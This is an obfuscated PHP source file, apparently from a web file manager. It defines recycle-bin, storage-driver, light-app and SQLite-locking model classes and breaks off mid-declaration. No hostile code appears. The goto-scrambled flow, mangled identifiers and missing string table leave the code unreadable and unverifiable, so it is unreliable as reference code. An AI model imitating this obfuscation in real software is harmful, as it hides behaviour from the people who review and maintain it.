<?php
 goto Eˆí ÑÔ¯Û; BÀÙ÷Áíåá: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\143\145\137\162\x65\x63\x79\x63\154\145"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\151\155\145", "\x74\151\155\x65", "\151\x6e\163\145\162\x74", "\x66\165\x6e\143\164\151\157\x6e")); public function listData($B„ì¸éÓÖº = false) { $AÛß„­ƒÒ =& $_SERVER[‘®…¢À]; $B„ì¸éÓÖº = $B„ì¸éÓÖº ? $B„ì¸éÓÖº : USER_ID; $c¯ºåïÙŠ = $this->where(array($AÛß„­ƒÒ[1328] => $B„ì¸éÓÖº))->select(); return array_to_keyvalue($c¯ºåïÙŠ, $AÛß„­ƒÒ[33], $AÛß„­ƒÒ[365]); } public function moveToRecycle($Dœé½¾‘èÚ) { goto bà·Óçé‡·; bà·Óçé‡·: $e¹Çµ½Ğó† =& $_SERVER[‘®…¢À]; $cÑ‘¥•„¼Ö = Model($e¹Çµ½Ğó†[1067]); $D‹­ïŞ˜ºà = $cÑ‘¥•„¼Ö->sourceInfo($Dœé½¾‘èÚ); goto C®§‡Ûíè; EˆÔèÇ—¿˜: $this->recycleMove($Dœé½¾‘èÚ, 1); if ($D‹­ïŞ˜ºà[$e¹Çµ½Ğó†[366]] == $e¹Çµ½Ğó†[84]) { $B¿ÉêÈ÷ = array($e¹Çµ½Ğó†[516] => array($e¹Çµ½Ğó†[474], $D‹­ïŞ˜ºà[$e¹Çµ½Ğó†[454]] . $Dœé½¾‘èÚ . $e¹Çµ½Ğó†[475])); $cÑ‘¥•„¼Ö->where($B¿ÉêÈ÷)->setField($e¹Çµ½Ğó†[392], 1); } goto föÓê†—; C®§‡Ûíè: if (!$D‹­ïŞ˜ºà || $D‹­ïŞ˜ºà[$e¹Çµ½Ğó†[392]] == $e¹Çµ½Ğó†[84]) { return; } $bÂ÷†Ø¥à = array($e¹Çµ½Ğó†[379] => $Dœé½¾‘èÚ, $e¹Çµ½Ğó†[1328] => USER_ID, $e¹Çµ½Ğó†[512] => $D‹­ïŞ˜ºà[$e¹Çµ½Ğó†[367]], $e¹Çµ½Ğó†[513] => $D‹­ïŞ˜ºà[$e¹Çµ½Ğó†[451]], $e¹Çµ½Ğó†[516] => $D‹­ïŞ˜ºà[$e¹Çµ½Ğó†[454]]); $this->add($bÂ÷†Ø¥à); goto EˆÔèÇ—¿˜; föÓê†—: } public function clear() { $this->remove(!1); } public function remove($dÕªÊ™òöÒ = false) { goto DµïÕ‹¦; DÙ”¶ÛãÙ: $dÕªÊ™òöÒ = $dÕªÊ™òöÒ === !1 ? !1 : $dÕªÊ™òöÒ; $aÉå£Æ·Ê¯ = array(); foreach ($c« É‘‡İÎ as $c•àì»õÅ¥) { if ($dÕªÊ™òöÒ != !1 && !in_array($c•àì»õÅ¥, $dÕªÊ™òöÒ)) { continue; } $bäâÏ•Î³¹->remove($c•àì»õÅ¥, !1); $càÅ°¤Ìêó = $this->where(array($F–¿À©«•ª[365] => $c•àì»õÅ¥))->find(); $FŞ±•£Ÿİ = $càÅ°¤Ìêó[$F–¿À©«•ª[367]] . $F–¿À©«•ª[71] . $càÅ°¤Ìêó[$F–¿À©«•ª[451]]; $aÉå£Æ·Ê¯[$FŞ±•£Ÿİ] = array($F–¿À©«•ª[512] => $càÅ°¤Ìêó[$F–¿À©«•ª[367]], $F–¿À©«•ª[451] => $càÅ°¤Ìêó[$F–¿À©«•ª[451]]); $this->where(array($F–¿À©«•ª[365] => $c•àì»õÅ¥))->delete(); } goto cóî£ÛÙ¹ó; DµïÕ‹¦: $F–¿À©«•ª =& $_SERVER[‘®…¢À]; $bäâÏ•Î³¹ = Model($F–¿À©«•ª[1067]); $c« É‘‡İÎ = $this->listData(); goto DÙ”¶ÛãÙ; cóî£ÛÙ¹ó: foreach ($aÉå£Æ·Ê¯ as $aê¥ªÓã±Ú) { $bäâÏ•Î³¹->targetSpaceUpdate($aê¥ªÓã±Ú[$F–¿À©«•ª[367]], $aê¥ªÓã±Ú[$F–¿À©«•ª[451]]); } goto aâå“‰èå“; aâå“‰èå“: } public function restore($eŒÀğòÙğÊ = false) { goto CÓ‡Ö¬öàÆ; CÓ‡Ö¬öàÆ: $A÷±Ÿ‚„â =& $_SERVER[‘®…¢À]; $b ö¸íŸŒ = Model($A÷±Ÿ‚„â[1067]); $a„ˆÑäÓ´ì = $this->listData(); goto e¡Ö —Ì‹Œ; e¡Ö —Ì‹Œ: $eŒÀğòÙğÊ = $eŒÀğòÙğÊ == !1 ? !1 : $eŒÀğòÙğÊ; if (!$a„ˆÑäÓ´ì) { return !0; } $e »±§ç = array(); goto få‡Óì‹¬„; få‡Óì‹¬„: foreach ($a„ˆÑäÓ´ì as $Cİ²Ñ‡—Š) { goto fíØ…Ğç’ ; cóâŠÛ¾ŸÚ: $e »±§ç[] = $dæßˆ…÷ƒ[$A÷±Ÿ‚„â[456]]; if ($dæßˆ…÷ƒ[$A÷±Ÿ‚„â[366]] == $A÷±Ÿ‚„â[84]) { $e »±§ç[] = $Cİ²Ñ‡—Š; } $b ö¸íŸŒ->lockMoveEnd($Cİ²Ñ‡—Š); goto eÖÀ±ƒôœš; fíØ…Ğç’ : if ($eŒÀğòÙğÊ != !1 && !in_array($Cİ²Ñ‡—Š, $eŒÀğòÙğÊ)) { continue; } $dæßˆ…÷ƒ = $b ö¸íŸŒ->sourceInfo($Cİ²Ñ‡—Š); $Dôâ¥‚Ô‘› = $b ö¸íŸŒ->sourceInfo($dæßˆ…÷ƒ[$A÷±Ÿ‚„â[456]]); goto DŒÜ£’¶À°; a…‰ßİ‹†È: if ($dæßˆ…÷ƒ[$A÷±Ÿ‚„â[366]] == $A÷±Ÿ‚„â[84]) { $DÎÏÎ‰ê°± = array($A÷±Ÿ‚„â[516] => array($A÷±Ÿ‚„â[474], $dæßˆ…÷ƒ[$A÷±Ÿ‚„â[454]] . $Cİ²Ñ‡—Š . $A÷±Ÿ‚„â[475])); $b ö¸íŸŒ->where($DÎÏÎ‰ê°±)->setField($A÷±Ÿ‚„â[392], 0); } $this->where(array($A÷±Ÿ‚„â[365] => $Cİ²Ñ‡—Š))->delete(); $b ö¸íŸŒ->folderSizeReset($dæßˆ…÷ƒ[$A÷±Ÿ‚„â[456]]); goto cóâŠÛ¾ŸÚ; DŒÜ£’¶À°: if ($Dôâ¥‚Ô‘›[$A÷±Ÿ‚„â[392]] == $A÷±Ÿ‚„â[84]) { continue; } $b ö¸íŸŒ->lockMoveStart($Cİ²Ñ‡—Š); $this->recycleMove($Cİ²Ñ‡—Š, 0); goto a…‰ßİ‹†È; eÖÀ±ƒôœš: } $b ö¸íŸŒ->updateModifyTime($e »±§ç); goto d„ÑÂ†À¯; d„ÑÂ†À¯: } private function recycleMove($Aó¼šáôœ¢, $D£Šæ Ñ£¬ = 1) { $c±¬Œºñ ® =& $_SERVER[‘®…¢À]; $D¢å©×‚Æ = Model($c±¬Œºñ ®[1067]); $Fœë‚äÜİ = Model($c±¬Œºñ ®[2236]); $f³­ÛÏá¸Á = array($c±¬Œºñ ®[365] => $Aó¼šáôœ¢); if ($D£Šæ Ñ£¬) { $D¢å©×‚Æ->where($f³­ÛÏá¸Á)->setField($c±¬Œºñ ®[392], 1); $Fœë‚äÜİ->eventRecycle($Aó¼šáôœ¢, $c±¬Œºñ ®[2237]); } else { $dˆƒç’‡–“ = $D¢å©×‚Æ->where($f³­ÛÏá¸Á)->find(); $d”ÔôŠ¬”­ = $dˆƒç’‡–“[$c±¬Œºñ ®[366]] == $c±¬Œºñ ®[84]; $Dƒ²…÷‘Ÿ = $D¢å©×‚Æ->fileNameAuto($dˆƒç’‡–“[$c±¬Œºñ ®[456]], $dˆƒç’‡–“[$c±¬Œºñ ®[28]], REPEAT_RENAME_FOLDER, $d”ÔôŠ¬”­); if ($Dƒ²…÷‘Ÿ != $dˆƒç’‡–“[$c±¬Œºñ ®[28]]) { $D¢å©×‚Æ->rename($Aó¼šáôœ¢, $Dƒ²…÷‘Ÿ); } $D¢å©×‚Æ->where($f³­ÛÏá¸Á)->setField($c±¬Œºñ ®[392], 0); $Fœë‚äÜİ->eventRecycle($Aó¼šáôœ¢, $c±¬Œºñ ®[2238]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\163\164\x6f\162\x61\147\145\114\151\163\164"; public $field = array("\156\x61\155\145", "\x73\x69\x7a\145\115\141\x78", "\x73\x79\x73\x74\x65\x6d", "\x64\145\x66\x61\x75\x6c\164", "\x64\x72\x69\166\145\x72", "\143\x6f\x6e\146\151\x67"); public function listData($D¤‘í™“Š = false, $DÎ¾ê”Ã§ = "\x6d\157\x64\x69\x66\171\124\151\155\145", $cŒÅî§’Áø = false) { goto Cîˆ×ÓÏÜ; BŠÓ«¦¢Áå: foreach ($F»ªØ›Õ“ as $F«™Í›·£Š => $Fœƒ¿•ÌÒÌ) { unset($F»ªØ›Õ“[$F«™Í›·£Š][$d©áÜ“ä[6]]); $F»ªØ›Õ“[$F«™Í›·£Š][$d©áÜ“ä[1986]] = 0; } $AŠØµòáÀÛ = array_to_keyvalue($F»ªØ›Õ“, $d©áÜ“ä[33], $d©áÜ“ä[363]); $this->_listAppendSize($F»ªØ›Õ“, $AŠØµòáÀÛ); goto C‘†ˆ‡¿Åƒ; C‘†ˆ‡¿Åƒ: return $F»ªØ›Õ“; goto fÆ‰ßâÅ‚; Cîˆ×ÓÏÜ: $d©áÜ“ä =& $_SERVER[‘®…¢À]; $F»ªØ›Õ“ = parent::listData($D¤‘í™“Š, $DÎ¾ê”Ã§, $cŒÅî§’Áø); if ($D¤‘í™“Š) { return $F»ªØ›Õ“; } goto BŠÓ«¦¢Áå; fÆ‰ßâÅ‚: } public function _listAppendSize(&$aÉó‹¶ó…í, $d¿àæÀå²À) { $eÈŸÚøÕå =& $_SERVER[‘®…¢À]; $F‘š»²Şñí = $eÈŸÚøÕå[2239] . implode($eÈŸÚøÕå[47], $d¿àæÀå²À) . $eÈŸÚøÕå[2240]; $bÂ°ªŒœ = Model($eÈŸÚøÕå[695])->query($F‘š»²Şñí); $bÂ°ªŒœ = array_to_keyvalue($bÂ°ªŒœ, $eÈŸÚøÕå[363], $eÈŸÚøÕå[78]); foreach ($aÉó‹¶ó…í as $FÒ”½†ùÍÙ => $E«ºóòĞ¼™) { $aÉó‹¶ó…í[$FÒ”½†ùÍÙ][$eÈŸÚøÕå[1986]] = isset($bÂ°ªŒœ[$E«ºóòĞ¼™[$eÈŸÚøÕå[363]]]) ? $bÂ°ªŒœ[$E«ºóòĞ¼™[$eÈŸÚøÕå[363]]] : 0; } } public function getConfig($C¦ÅÖ‡’Ê) { $bŒÏ¡¶‰Š† = parent::listData($C¦ÅÖ‡’Ê); return json_decode($bŒÏ¡¶‰Š†[$_SERVER[‘®…¢À][6]], !0); } public function update($dĞÅµ½„¿´, $e¸…ï­ÅÙ³) { goto EÛ²Ÿ†À³„; BŒ³îÂÑĞ: if (isset($bŞŸ…œŠîƒ[$eˆöòæÇè]) && $bŞŸ…œŠîƒ[$eˆöòæÇè][$a£î¯¬½”[363]] != $dĞÅµ½„¿´) { return !1; } if (isset($e¸…ï­ÅÙ³[$a£î¯¬½”[2241]]) && $e¸…ï­ÅÙ³[$a£î¯¬½”[2241]] == $a£î¯¬½”[84]) { $this->checkConfig($e¸…ï­ÅÙ³); } unset($e¸…ï­ÅÙ³[$a£î¯¬½”[2241]]); goto EÌ¦ŒÍª¤ß; EÛ²Ÿ†À³„: $a£î¯¬½” =& $_SERVER[‘®…¢À]; $eˆöòæÇè = $e¸…ï­ÅÙ³[$a£î¯¬½”[28]]; $bŞŸ…œŠîƒ = array_to_keyvalue(parent::listData(), $a£î¯¬½”[28]); goto BŒ³îÂÑĞ; EÌ¦ŒÍª¤ß: $A‚ÉÓß‰×Œ = parent::update($dĞÅµ½„¿´, $e¸…ï­ÅÙ³); if ($A‚ÉÓß‰×Œ && $e¸…ï­ÅÙ³[$a£î¯¬½”[34]]) { foreach ($bŞŸ…œŠîƒ as $a¸¡°’È«š) { if ($a¸¡°’È«š[$a£î¯¬½”[34]] && $a¸¡°’È«š[$a£î¯¬½”[363]] != $dĞÅµ½„¿´) { parent::update($a¸¡°’È«š[$a£î¯¬½”[363]], array($a£î¯¬½”[34] => 0)); } } } return $A‚ÉÓß‰×Œ; goto d†ÇÍ—îã; d†ÇÍ—îã: } public function add($a¾ÄÍ°ÀŸ†) { goto dí ˆ‚ÎŞÄ; b•àÙ©„›ß: return $eï‘ˆ¦Æáó; goto FäŠøÅ¶ğÎ; dí ˆ‚ÎŞÄ: $a¸¯…ğìµ =& $_SERVER[‘®…¢À]; $bÃÖÌ˜ÀÅ = array_to_keyvalue(parent::listData(), $a¸¯…ğìµ[28]); if (isset($bÃÖÌ˜ÀÅ[$a¾ÄÍ°ÀŸ†[$a¸¯…ğìµ[28]]])) { return !1; } goto cÙ·×¤Ú§; cÙ·×¤Ú§: $this->checkConfig($a¾ÄÍ°ÀŸ†); $eï‘ˆ¦Æáó = parent::insert($a¾ÄÍ°ÀŸ†); if ($eï‘ˆ¦Æáó && $a¾ÄÍ°ÀŸ†[$a¸¯…ğìµ[34]]) { foreach ($bÃÖÌ˜ÀÅ as $DªôŠ®…Ìƒ) { if ($DªôŠ®…Ìƒ[$a¸¯…ğìµ[34]]) { parent::update($DªôŠ®…Ìƒ[$a¸¯…ğìµ[363]], array($a¸¯…ğìµ[34] => 0)); } } } goto b•àÙ©„›ß; FäŠøÅ¶ğÎ: } public function checkConfig(&$A«‚£æ©÷Ú) { goto f¤Á„Ìï›Ì; cŸâ…Ó™¹: foreach ($eçÒë¡Œ®­ as $C†Ûñ¶ÓÙ => $Fš¨‚‘ÌÄ±) { $eçÒë¡Œ®­[$C†Ûñ¶ÓÙ] = trim($Fš¨‚‘ÌÄ±); } $BÏñ½ğ’ÑÒ = rtrim($eçÒë¡Œ®­[$dÆ°çíêã[980]], $dÆ°çíêã[8]) . $dÆ°çíêã[8]; $dˆÒÍì¢ñ½ = $this->driverType($f™í°Êïâ); goto fŒ¥¥‚¾¸³; f¤Á„Ìï›Ì: $dÆ°çíêã =& $_SERVER[‘®…¢À]; $f™í°Êïâ = strtolower($A«‚£æ©÷Ú[$dÆ°çíêã[91]]); $eçÒë¡Œ®­ = json_decode_force($A«‚£æ©÷Ú[$dÆ°çíêã[6]]); goto cŸâ…Ó™¹; fŒ¥¥‚¾¸³: $FÏŸ®Åàì = $dÆ°çíêã[72] . $dˆÒÍì¢ñ½; $BóƒŞÍÛÓ = new $FÏŸ®Åàì($eçÒë¡Œ®­); if (in_array($f™í°Êïâ, $BóƒŞÍÛÓ->objectDriver)) { if (!$BóƒŞÍÛÓ->isBucketCors() && !$BóƒŞÍÛÓ->setBucketCors()) { $Aù¡§ÇÀ“¯ = LNG($dÆ°çíêã[2242]); $Aù¡§ÇÀ“¯ .= $dÆ°çíêã[2243] . LNG($dÆ°çíêã[2244]); show_json($Aù¡§ÇÀ“¯, !1); } } goto DÏ‚ô¥ˆ; F¶ªÏ‹Ô­ä: $A«‚£æ©÷Ú[$dÆ°çíêã[6]] = json_encode($eçÒë¡Œ®­); $A«‚£æ©÷Ú[$dÆ°çíêã[91]] = $dˆÒÍì¢ñ½; return !0; goto FÊŞ­¥Ï—´; DÏ‚ô¥ˆ: $BŒïëÔ±ç = $BóƒŞÍÛÓ->getPath($BÏñ½ğ’ÑÒ . $dÆ°çíêã[1883]); if (!$BóƒŞÍÛÓ->mkfile($BŒïëÔ±ç)) { show_json(LNG($dÆ°çíêã[2242]), !1); } $eçÒë¡Œ®­[$dÆ°çíêã[980]] = $BÏñ½ğ’ÑÒ; goto F¶ªÏ‹Ô­ä; FÊŞ­¥Ï—´: } private function driverType($b›Ì‘˜÷“) { $Có‘ÒÙ‚•ø =& $_SERVER[‘®…¢À]; $EÇ®ÖŞ© = array($Có‘ÒÙ‚•ø[104] => $Có‘ÒÙ‚•ø[2245], $Có‘ÒÙ‚•ø[58] => $Có‘ÒÙ‚•ø[2246], $Có‘ÒÙ‚•ø[65] => $Có‘ÒÙ‚•ø[981]); if (isset($EÇ®ÖŞ©[$b›Ì‘˜÷“])) { return $EÇ®ÖŞ©[$b›Ì‘˜÷“]; } return strtoupper($b›Ì‘˜÷“); } public function driverListSystem() { $fœÎ·ÏìÁå =& $_SERVER[‘®…¢À]; $D¶¬æ×Š·ï = parent::listData(); $Bø…ÕĞ¼ïÄ = array(); foreach ($D¶¬æ×Š·ï as $eø¬–Ç¿£¸) { unset($eø¬–Ç¿£¸[$fœÎ·ÏìÁå[184]], $eø¬–Ç¿£¸[$fœÎ·ÏìÁå[108]]); $eø¬–Ç¿£¸[$fœÎ·ÏìÁå[6]] = json_decode_force($eø¬–Ç¿£¸[$fœÎ·ÏìÁå[6]]); $Bø…ÕĞ¼ïÄ[] = $eø¬–Ç¿£¸; } return $Bø…ÕĞ¼ïÄ; } public function defaultDriver() { $BÃœ¦ÌÁË‚ =& $_SERVER[‘®…¢À]; $BÌòëÁé‹ö = parent::listData(); $Cò·×¾éãã = array_filter_by_field($BÌòëÁé‹ö, $BÃœ¦ÌÁË‚[34], 1); $Cò·×¾éãã = $Cò·×¾éãã[0]; if ($Cò·×¾éãã) { $Cò·×¾éãã[$BÃœ¦ÌÁË‚[6]] = json_decode($Cò·×¾éãã[$BÃœ¦ÌÁË‚[6]], !0); } return $Cò·×¾éãã; } public function driverInfo($BòÊ¦¢¹Ãö) { $båÜ¡«˜‰ø =& $_SERVER[‘®…¢À]; $CÜôº¨Åºã = array_to_keyvalue(parent::listData(), $båÜ¡«˜‰ø[363]); if (!isset($CÜôº¨Åºã[$BòÊ¦¢¹Ãö])) { return !1; } $D¨«÷ƒ±ÒÉ = $CÜôº¨Åºã[$BòÊ¦¢¹Ãö]; $D¨«÷ƒ±ÒÉ[$båÜ¡«˜‰ø[6]] = json_decode_force($D¨«÷ƒ±ÒÉ[$båÜ¡«˜‰ø[6]]); return $D¨«÷ƒ±ÒÉ; } public function removeWithFile($FåïÚ›Øãâ) { goto b’•š¯á¦Ó; b’•š¯á¦Ó: $EÔöØ¹ÖÍ« =& $_SERVER[‘®…¢À]; $eëÄô’è‡ = array($EÔöØ¹ÖÍ«[696] => $FåïÚ›Øãâ); $d¶”‰…ˆ»Ñ = Model($EÔöØ¹ÖÍ«[417])->where($eëÄô’è‡)->count(); goto AÏƒíšÁù¤; e¹À·§Ş¹: $DöÄÖŸ£‹Ÿ = Model($EÔöØ¹ÖÍ«[164])->where($eëÄô’è‡)->field($EÔöØ¹ÖÍ«[2250])->select(); foreach ($DöÄÖŸ£‹Ÿ as $EßòÈÅƒ½Å) { goto c‡ÅÀƒÜ…; c’øôĞ¢¥Ê: if (IO::exist($B¸–”‘—à)) { $Dùöá°îæƒ->updateFileEnd($EßòÈÅƒ½Å[$EÔöØ¹ÖÍ«[28]], $EßòÈÅƒ½Å[$EÔöØ¹ÖÍ«[78]]); continue; } if (!IO::move($f¢³§¨Ÿ©é, get_path_father($B¸–”‘—à))) { $dµ¡ˆæŸİ” = !1; break; } $eëÄô’è‡ = array($EÔöØ¹ÖÍ«[414] => $EßòÈÅƒ½Å[$EÔöØ¹ÖÍ«[414]]); goto AÃë£—Š»ˆ; c‡ÅÀƒÜ…: $f¢³§¨Ÿ©é = $EßòÈÅƒ½Å[$EÔöØ¹ÖÍ«[76]]; $B¸–”‘—à = $a°«Šã¹šÓ . str_replace("\173\151\157\72{$FåïÚ›Øãâ}\x7d\57", $EÔöØ¹ÖÍ«[33], $f¢³§¨Ÿ©é); if (!IO::exist($f¢³§¨Ÿ©é)) { $DƒÅ“òì•Ê[] = $EßòÈÅƒ½Å[$EÔöØ¹ÖÍ«[414]]; $Dùöá°îæƒ->updateFileEnd($EßòÈÅƒ½Å[$EÔöØ¹ÖÍ«[28]], $EßòÈÅƒ½Å[$EÔöØ¹ÖÍ«[78]]); continue; } goto c’øôĞ¢¥Ê; AÃë£—Š»ˆ: $eÙë÷é®Ê = array($EÔöØ¹ÖÍ«[696] => $A¼Àõ„·‡—, $EÔöØ¹ÖÍ«[76] => $B¸–”‘—à); Model($EÔöØ¹ÖÍ«[164])->where($eëÄô’è‡)->save($eÙë÷é®Ê); goto c¿Í±á ì; c¿Í±á ì: } $this->removeByFileID($DƒÅ“òì•Ê); goto F‘¤¸ñ¯Ø„; eÙóƒ–ÇÓõ: $a°«Šã¹šÓ = "\173\151\x6f\x3a{$A¼Àõ„·‡—}\x7d\x2f"; $dµ¡ˆæŸİ” = !0; $DƒÅ“òì•Ê = array(); goto e¹À·§Ş¹; F‘¤¸ñ¯Ø„: if (!$dµ¡ˆæŸİ”) { $Dùöá°îæƒ->stop($b½ÏŞÄÂÍ); return !1; } $Dùöá°îæƒ->end(); return parent::remove($FåïÚ›Øãâ); goto e‘¥‹ğ––; AÏƒíšÁù¤: $AØÍ·Êæ = Model($EÔöØ¹ÖÍ«[417])->where($eëÄô’è‡)->sum($EÔöØ¹ÖÍ«[78]); $b½ÏŞÄÂÍ = $EÔöØ¹ÖÍ«[2247] . $FåïÚ›Øãâ; $Dùöá°îæƒ = new TaskFileTransfer($b½ÏŞÄÂÍ, $EÔöØ¹ÖÍ«[2248], $d¶”‰…ˆ»Ñ, LNG($EÔöØ¹ÖÍ«[2249]) . "\50{$FåïÚ›Øãâ}\x29"); goto dÃà‚Åå‘¶; dÃà‚Åå‘¶: $Dùöá°îæƒ->task[$EÔöØ¹ÖÍ«[671]] = (double) $AØÍ·Êæ; $Aó‘¥°«ÆÇ = KodIO::defaultDriver(); $A¼Àõ„·‡— = $Aó‘¥°«ÆÇ[$EÔöØ¹ÖÍ«[363]]; goto eÙóƒ–ÇÓõ; e‘¥‹ğ––: } public function progress($cñ­½ÕƒñÂ) { return Task::get($_SERVER[‘®…¢À][2247] . $cñ­½ÕƒñÂ); } private function removeByFileID($cß¡’êÒñ = array()) { goto bÒìÈ¡ğ™; A£ÁìØ–¶º: $EĞôÚ»Ãä = Model($D¯ƒ²ã¿[1067])->where($FÛµÚ·Õì)->field($D¯ƒ²ã¿[365])->select(); if (!$EĞôÚ»Ãä) { return; } $EĞôÚ»Ãä = array_to_keyvalue($EĞôÚ»Ãä, $D¯ƒ²ã¿[33], $D¯ƒ²ã¿[365]); goto A®«ªå…; A®«ªå…: foreach ($EĞôÚ»Ãä as $FÂî÷—›àî) { Model($D¯ƒ²ã¿[378])->remove($FÂî÷—›àî, !1); } goto Eö‹ºŒ¼é·; bÒìÈ¡ğ™: $D¯ƒ²ã¿ =& $_SERVER[‘®…¢À]; if (empty($cß¡’êÒñ)) { return; } $FÛµÚ·Õì = array($D¯ƒ²ã¿[414] => array($D¯ƒ²ã¿[7], $cß¡’êÒñ)); goto A£ÁìØ–¶º; Eö‹ºŒ¼é·: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\114\151\147\150\164\101\x70\x70"; public $modelType = "\123\171\x73\x74\145\x6d\x4f\160\164\151\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\x67\x72\x6f\165\160", "\x64\x65\x73\143", "\x63\x6f\x6e\164\x65\x6e\x74"); public function listData($c¸®®Ó³ˆÛ = false, $B’±ÙÏ÷Î = "\155\157\x64\151\146\x79\x54\x69\x6d\x65", $cŒµªœ›ï = true) { return parent::listData($c¸®®Ó³ˆÛ, $B’±ÙÏ÷Î, $cŒµªœ›ï); } public function remove($F¡¶ÂˆŒÁ–) { $E¸¢ë“†Äî = $this->findByName($F¡¶ÂˆŒÁ–); if (!$E¸¢ë“†Äî) { return !1; } return parent::remove($E¸¢ë“†Äî[$_SERVER[‘®…¢À][363]]); } public function add($b³İ¡ç„öç) { if ($this->findByName($b³İ¡ç„öç[$_SERVER[‘®…¢À][28]])) { return !1; } return parent::insert($b³İ¡ç„öç); } public function update($E×ø®è«¨, $FÙ÷Æã‡Ñ¨) { $Eâ¡‘Ù¢¼§ =& $_SERVER[‘®…¢À]; $FÍôº£Ø‹Ú = $this->findByName($E×ø®è«¨); $CÉÏ­šæº’ = $this->findByName($FÙ÷Æã‡Ñ¨[$Eâ¡‘Ù¢¼§[28]]); if (!$FÍôº£Ø‹Ú || $CÉÏ­šæº’ && $CÉÏ­šæº’[$Eâ¡‘Ù¢¼§[363]] != $FÍôº£Ø‹Ú[$Eâ¡‘Ù¢¼§[363]]) { return !1; } return parent::update($FÍôº£Ø‹Ú[$Eâ¡‘Ù¢¼§[363]], $FÙ÷Æã‡Ñ¨); } } goto BßËÅãÂí; aØ¾‚œÓÆ: class DbSqlite extends DbSqliteBase { public function query($f¯­Øâê) { goto D–ÆõØ¦±ğ; e³îÜéÕí: fclose($eœ†â©ÇÊ); show_json($d‘÷­´ùãá[855], !1); return !1; goto fè—½‹ğ‰Ù; f³Âä¬†Ù: if (!$eœ†â©ÇÊ) { return !1; } if (flock($eœ†â©ÇÊ, LOCK_EX)) { $b„‘°–«…Î = parent::query($f¯­Øâê); flock($eœ†â©ÇÊ, LOCK_UN); fclose($eœ†â©ÇÊ); return $b„‘°–«…Î; } flock($eœ†â©ÇÊ, LOCK_UN); goto e³îÜéÕí; D–ÆõØ¦±ğ: $d‘÷­´ùãá =& $_SERVER[‘®…¢À]; $bÓ°»È…„« = DATA_PATH . $d‘÷­´ùãá[853]; $eœ†â©ÇÊ = fopen($bÓ°»È…„«, $d‘÷­´ùãá[854]); goto f³Âä¬†Ù; fè—½‹ğ‰Ù: } public function execute($dÊñ†Ïùæ) { goto d¯éåŠÛµ; d¯éåŠÛµ: $E–Š­…ÉöÊ =& $_SERVER[‘®…¢À]; $EĞ‹ğä÷ù‰ = DATA_PATH . $E–Š­…ÉöÊ[853]; $F¾™ãù¦±é = fopen($EĞ‹ğä÷ù‰, $E–Š­…ÉöÊ[854]); goto b†¦†Û±´; FÌÆêòÅÚŠ: fclose($F¾™ãù¦±é); show_json($E–Š­…ÉöÊ[855], !1); return !1; goto EùÍ®èœà‡; b†¦†Û±´: if (!$F¾™ãù¦±é) { return !1; } if (flock($F¾™ãù¦±é, LOCK_EX)) { $BØ®’¤” = parent::execute($dÊñ†Ïùæ); flock($F¾™ãù¦±é, LOCK_UN); fclose($F¾™ãù¦±é); return $BØ®’¤”; } flock($F¾™ãù¦±é, LOCK_UN); goto FÌÆêòÅÚŠ; EùÍ®èœà‡: } } class DbSqlite3 extends DbSqlite3Base { public function query($e¼„‰¨Ù¾ª) { goto A»Ü²õ‘ƒ; A»Ü²õ‘ƒ: $eµ„ˆéÊ† =& $_SERVER[‘®…¢À]; $F³½ôŒÜ† = DATA_PATH . $eµ„ˆéÊ†[853]; $aÜƒ‡æÅ’ö = fopen($F³½ôŒÜ†, $eµ„ˆéÊ†[854]); goto Dùéù¬²Î; Dùéù¬²Î: if (!$aÜƒ‡æÅ’ö) { return !1; } if (flock($aÜƒ‡æÅ’ö, LOCK_EX)) { $fÎáÆ÷ñÓæ = parent::query($e¼„‰¨Ù¾ª); flock($aÜƒ‡æÅ’ö, LOCK_UN); fclose($aÜƒ‡æÅ’ö); return $fÎáÆ÷ñÓæ; } flock($aÜƒ‡æÅ’ö, LOCK_UN); goto cèŞ‚‘ÂâŞ; cèŞ‚‘ÂâŞ: fclose($aÜƒ‡æÅ’ö); show_json($eµ„ˆéÊ†[855], !1); return !1; goto BåîóŠÚö‹; BåîóŠÚö‹: } public function execute($a¿¡ïÊ¦è—) { goto DÒá× Åê³; DÒá× Åê³: $cšˆèº‰æ‡ =& $_SERVER[‘®…¢À]; $DÀë±öÅ = DATA_PATH . $cšˆèº‰æ‡[853]; $b¾Ñ…æ‡à = fopen($DÀë±öÅ, $cšˆèº‰æ‡[854]); goto e¤„Ãï·Äº; fÄØ¿Ù…ŸŠ: fclose($b¾Ñ…æ‡à); show_json($cšˆèº‰æ‡[855], !1); return !1; goto bĞ±™ùÄª; e¤„Ãï·Äº: if (!$b¾Ñ…æ‡à) { return !1; } if (flock($b¾Ñ…æ‡à, LOCK_EX)) { $cíÇ”çÅé = parent::execute($a¿¡ïÊ¦è—); flock($b¾Ñ…æ‡à, LOCK_UN); fclose($b¾Ñ…æ‡à); return $cíÇ”çÅé; } flock($b¾Ñ…æ‡à, LOCK_UN); goto fÄØ¿Ù…ŸŠ; bĞ±™ùÄª: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\x71" => "\x3c\x3e", "\x67\164" => "\x3e", "\145\147\164" => "\x3e\75", "\154\164" => "\x3c", "\x65\x6c\164" => "\x3c\75", "\x6e\157\x74\x6c\x69\x6b\x65" => "\x4e\x4f\124\x20\x4c\111\113\105", "\x6c\151\x6b\145" => "\114\x49\x4b\x45", "\151\156" => "\111\116", "\156\x6f\164\151\156" => "\116\117\124\40\111\116", "\x6e\157\x74\40\151\156" => "\x4e\x4f\x54\x20\111\x4e", "\x62\145\164\167\x65\145\x6e" => "\102\105\x54\127\x45\x45\x4e", "\156\x6f\164\142\145\164\167\145\x65\156" => "\116\x4f\x54\40\x42\x45\124\x57\x45\105\x4e", "\x6e\157\164\x20\142\x65\x74\x77\145\145\x6e" => "\x4e\x4f\124\x20\102\105\x54\127\x45\105\x4e"); protected $selectSql = 